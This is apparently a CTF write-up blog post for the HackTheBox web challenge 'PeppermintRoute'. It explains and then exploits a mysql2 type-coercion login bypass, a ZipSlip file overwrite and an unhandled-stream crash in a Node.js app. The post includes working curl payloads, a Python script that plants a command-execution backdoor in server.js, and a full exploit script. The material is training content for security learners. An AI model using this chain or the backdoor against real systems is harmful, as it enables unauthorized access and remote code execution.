---
layout: post
title: "PeppermintRoute CTF Writeup"
date: 2025-12-22 14:00:00 +0300
categories: [HackTheBox, CTFs]
tags: [cybersecurity, web, hackthebox, sqli, zipslip, rce, nodejs]
---

# 🎄 PeppermintRoute CTF Writeup

Today I'll walk you through my process of solving the **PeppermintRoute** web challenge. This is a Medium difficulty challenge that involves chaining multiple vulnerabilities to achieve RCE. Let's dive in!

---

## 📋 Challenge Overview

| Property | Value |
|----------|-------|
| **Name** | PeppermintRoute |
| **Category** | Web |
| **Difficulty** | Medium |

The challenge provides a Node.js web application for managing sleigh routes. It uses **Express**, **MySQL**, and a custom `ZipParser` utility. The goal is to exploit vulnerabilities to read the flag from `/root/flag.txt` via a provided SUID binary `/readflag`.

---

## 🏗️ Application Architecture

The application structure:

```
app/
├── server.js              # Main Express server
├── controllers/
│   ├── authController.js  # Login/logout handling
│   ├── adminController.js # Admin file upload
│   └── fileController.js  # File download
├── utils/
│   └── zipParser.js       # Custom ZIP extraction
└── models/
    └── mysqldb.js         # Database queries
```

Key configuration in `server.js`:

```javascript
const app = express();
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
```

> ⚠️ Notice `extended: true` - this allows parsing **nested objects** in request bodies!
{: .prompt-warning }

---

## 🔎 Vulnerability Analysis

### 1. Authentication Bypass (SQL Injection via Type Coercion)

The application uses `mysql2` with `body-parser` configured with `extended: true`. This allows passing **objects** in the POST body.

In [authController.js](https://github.com/dogujen/dogujen.github.io), the login function:

```javascript
exports.postLogin = async (req, res) => {
    const { username, password } = req.body;

    if (username && password) {
        try {
            const results = await query(
                'SELECT * FROM users WHERE username = ? AND password = ?',
                [username, password]
            );

            if (results.length > 0) {
                const user = results[0];
                req.session.userId = user.id;
                req.session.username = user.username;
                req.session.role = user.role;
                // ... redirect based on role
            }
        } catch (error) {
            // ...
        }
    }
};
```

While parameterized queries prevent traditional SQLi, the `mysql2` library has interesting behavior when you pass an **object** instead of a string.

#### 🧪 How Type Coercion Works

When you send:
```json
{
    "username": {"role": "user"},
    "password": {"role": "user"}
}
```

The `mysql2` library tries to convert the object `{"role": "user"}` to a string for the query. In MySQL's context, this object gets compared in a way that results in the value `0`.

**Why does this work?**

In MySQL, when comparing a string to an integer:
- `'admin_xyz123' = 0` → **TRUE** (string starting with letter casts to 0)
- `'password_abc' = 0` → **TRUE** (same reason)

So the query effectively becomes:
```sql
SELECT * FROM users WHERE username = 0 AND password = 0
```

Since all usernames and passwords start with letters (e.g., `admin_...`, `pilot_...`), they all cast to `0`, and the first user (admin) is returned!

> 💡 This is a lesser-known attack vector. Even "safe" parameterized queries can be vulnerable when type handling is abused.
{: .prompt-tip }

---

### 2. ZipSlip (Arbitrary File Write)

The developer created a custom `ZipParser` class (to avoid "supply chain attacks" 😅):

```javascript
/*
    Created my own zip parser because I'm afraid of those supply chain attacks.
*/

class ZipParser {
    // ...
    
    extractAll(destDir) {
        const entries = this.findEntries();
        const extractedFiles = [];

        for (const entry of entries) {
            try {
                // "Security" check - only prevents deep nesting
                const parts = entry.fileName.split('/').filter(p => p);
                if (parts.length > 4) {
                    console.error(`Path too deep: ${entry.fileName}`);
                    continue;
                }

                // VULNERABLE: No path traversal check!
                const fullPath = path.join(destDir, entry.fileName);

                const dir = path.dirname(fullPath);
                if (!fs.existsSync(dir)) {
                    fs.mkdirSync(dir, { recursive: true });
                }

                // ... extract and write file
                extractedFiles.push(fullPath);
                fs.writeFileSync(fullPath, content);

            } catch (e) {
                console.error(`Error extracting ${entry.fileName}: ${e.message}`);
            }
        }
        return extractedFiles;
    }
}
```

#### 🐛 The Bug

The "security" check only counts path segments:
```javascript
const parts = entry.fileName.split('/').filter(p => p);
if (parts.length > 4) { continue; }
```

A malicious filename like `../../../server.js` splits into:
- `..` → segment 1
- `..` → segment 2  
- `..` → segment 3
- `server.js` → segment 4

**Only 4 segments!** The check passes, and `path.join()` resolves the traversal:

```javascript
path.join('/app/data/uploads/recipient', '../../../server.js')
// → '/app/server.js'
```

> 🎯 Classic ZipSlip vulnerability - always validate that extracted paths stay within the intended directory!
{: .prompt-danger }

---

### 3. Server Crash (Unhandled Stream Error)

To make the backdoor work, we need to **restart the server** so it loads our malicious `server.js`. The app runs under `supervisord` which auto-restarts crashed processes.

In `fileController.js`:

```javascript
exports.downloadAttachment = async (req, res) => {
    try {
        const { fileId } = req.query;
        // ... validation ...
        
        const filePath = fileRecord.filepath;
        
        // Path traversal check (looks secure!)
        const resolvedFilePath = path.resolve(filePath);
        const uploadsDir = path.resolve('/app/data/uploads');
        if (!resolvedFilePath.startsWith(uploadsDir + path.sep)) {
            return res.status(403).json({ error: 'Access denied: Invalid file location' });
        }

        res.setHeader('Content-Disposition', `attachment; filename="${fileRecord.filename}"`);
        res.setHeader('Content-Type', 'application/octet-stream');

        // VULNERABLE: No error handler on stream!
        const fileStream = fs.createReadStream(filePath);
        fileStream.pipe(res);
        
    } catch (error) {
        console.error('Download error:', error);
        res.status(500).json({ error: 'Error downloading file' });
    }
};
```

#### 💥 The Crash Vector

The `try/catch` only catches **synchronous** errors. But `fs.createReadStream()` operates asynchronously and emits errors through events.

If `filePath` points to a **directory**, the stream emits an `error` event:

```
Error: EISDIR: illegal operation on a directory, read
```

Since there's no `.on('error', ...)` handler, this becomes an **unhandled exception** and crashes Node.js!

#### 🎭 How to Create a Directory Entry

Looking at `adminController.js`:

```javascript
for (const file of req.files) {
    if (file.originalname.endsWith('.zip')) {
        const parser = new ZipParser(zipPath);
        const extractedFiles = parser.extractAll(extractDir);

        // Files are added to DB AFTER extraction
        for (const filePath of extractedFiles) {
            const fileName = path.basename(filePath);
            await query(
                `REPLACE INTO file_attachments (file_id, recipient, filename, filepath)
                 VALUES (?, ?, ?, ?)`,
                [fileId, recipient, fileName, filePath]
            );
        }
    }
}
```

The trick:
1. ZIP entry `crash_me/placeholder.txt` creates directory `crash_me/`
2. ZIP entry `crash_me` (file) tries to overwrite the directory → **fails**
3. But `extractedFiles.push(fullPath)` happens **before** `writeFileSync`
4. So `crash_me` (the directory path) gets added to the database!

Downloading `crash_me` → `createReadStream` on directory → 💥 **CRASH**

---

## 🚀 Exploitation Steps

### Step 1: Login as Admin

Send a POST request to `/login` with the JSON payload:

```bash
curl -X POST "http://TARGET:PORT/login" \
  -H "Content-Type: application/json" \
  -d '{"username": {"role": "user"}, "password": {"role": "user"}}' \
  -c admin_cookies.txt
```

This grants access to the admin dashboard! 🎉

---

### Step 2: Login as Pilot

We also need a pilot account to access the `/user/packages/.../download` endpoint (admin cannot download directly).

First, get the pilot usernames from the admin API:

```bash
curl -X GET "http://TARGET:PORT/api/admin/pilots-data" \
  -b admin_cookies.txt
```

Then login as a pilot using the same SQLi technique:

```bash
curl -X POST "http://TARGET:PORT/login" \
  -H "Content-Type: application/json" \
  -d '{"username": "pilot_aurora_...", "password": {"role": "admin"}}' \
  -c pilot_cookies.txt
```

---

### Step 3: Overwrite `server.js` with Backdoor

Create a malicious ZIP file containing a file named `../../../server.js` with this backdoor:

```javascript
const express = require('express');
const { exec } = require('child_process');
const app = express();
app.get('/backdoor', (req, res) => {
    exec(req.query.cmd, (err, stdout, stderr) => {
        res.send(stdout + stderr);
    });
});
app.listen(3000, '0.0.0.0');
```

Python script to create the malicious ZIP:

```python
import zipfile
import io

backdoor_code = '''const express = require('express');
const { exec } = require('child_process');
const app = express();
app.get('/backdoor', (req, res) => {
    exec(req.query.cmd, (err, stdout, stderr) => {
        res.send(stdout + stderr);
    });
});
app.listen(3000, '0.0.0.0');
'''

zip_buffer = io.BytesIO()
with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
    zf.writestr('../../../server.js', backdoor_code)

with open('backdoor.zip', 'wb') as f:
    f.write(zip_buffer.getvalue())
```

Upload this via `/admin/recipients/clarion/upload`.

---

### Step 4: Trigger Server Crash

Create a crash ZIP with two entries:

```python
import zipfile
import io

zip_buffer = io.BytesIO()
with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
    # First create the directory
    zf.writestr('crash_me/placeholder.txt', 'placeholder')
    # Then try to write a file with the same name (will fail)
    zf.writestr('crash_me', 'crash content')

with open('crash.zip', 'wb') as f:
    f.write(zip_buffer.getvalue())
```

Upload this ZIP, then:

1. Find the `fileId` for `crash_me` from `/api/admin/package/clarion`
2. Use the pilot session to request `/user/packages/clarion/download?fileId=...`

The server crashes and `supervisord` restarts it, loading the backdoored `server.js`! 💥

---

### Step 5: Read Flag 🏁

Access the backdoor to execute `/readflag`:

```bash
curl "http://TARGET:PORT/backdoor?cmd=/readflag"
```

**Flag captured!** 🎄🚩

---

## 🧠 Key Takeaways

This challenge demonstrates several important web security concepts:

1. **Type Coercion Attacks**: Even parameterized queries can be vulnerable when unexpected data types are passed
2. **ZipSlip**: Always validate extracted file paths against directory traversal
3. **Error Handling**: Unhandled stream errors in Node.js can crash the entire process
4. **Defense in Depth**: Multiple small vulnerabilities can be chained for critical impact

---

## 🔧 Full Exploit Script

```python
import requests
import zipfile
import io
import time

TARGET = "http://TARGET:PORT"

def create_backdoor_zip():
    backdoor_code = '''const express = require('express');
const { exec } = require('child_process');
const app = express();
app.get('/backdoor', (req, res) => {
    exec(req.query.cmd, (err, stdout, stderr) => {
        res.send(stdout + stderr);
    });
});
app.listen(3000, '0.0.0.0');
'''
    zip_buffer = io.BytesIO()
    with zipfile.ZipFile(zip_buffer, 'w') as zf:
        zf.writestr('../../../server.js', backdoor_code)
    return zip_buffer.getvalue()

def create_crash_zip():
    zip_buffer = io.BytesIO()
    with zipfile.ZipFile(zip_buffer, 'w') as zf:
        zf.writestr('crash_me/placeholder.txt', 'x')
        zf.writestr('crash_me', 'x')
    return zip_buffer.getvalue()

# Step 1: Login as Admin
admin_session = requests.Session()
admin_session.post(f"{TARGET}/login", json={
    "username": {"role": "user"},
    "password": {"role": "user"}
})

# Step 2: Get pilot username and login
pilots = admin_session.get(f"{TARGET}/api/admin/pilots-data").json()
pilot_username = pilots['pilots'][0]['username']

pilot_session = requests.Session()
pilot_session.post(f"{TARGET}/login", json={
    "username": pilot_username,
    "password": {"role": "admin"}
})

# Step 3: Upload backdoor
admin_session.post(
    f"{TARGET}/admin/recipients/clarion/upload",
    files={'file': ('backdoor.zip', create_backdoor_zip(), 'application/zip')}
)

# Step 4: Upload crash and trigger
admin_session.post(
    f"{TARGET}/admin/recipients/clarion/upload",
    files={'file': ('crash.zip', create_crash_zip(), 'application/zip')}
)

# Get fileId for crash_me
package_data = admin_session.get(f"{TARGET}/api/admin/package/clarion").json()
crash_file_id = [f['id'] for f in package_data['files'] if f['filename'] == 'crash_me'][0]

# Trigger crash
try:
    pilot_session.get(f"{TARGET}/user/packages/clarion/download?fileId={crash_file_id}", timeout=2)
except:
    pass

# Step 5: Wait and get flag
time.sleep(3)
flag = requests.get(f"{TARGET}/backdoor?cmd=/readflag").text
print(f"FLAG: {flag}")
```

---

Thanks for reading! 🎄  

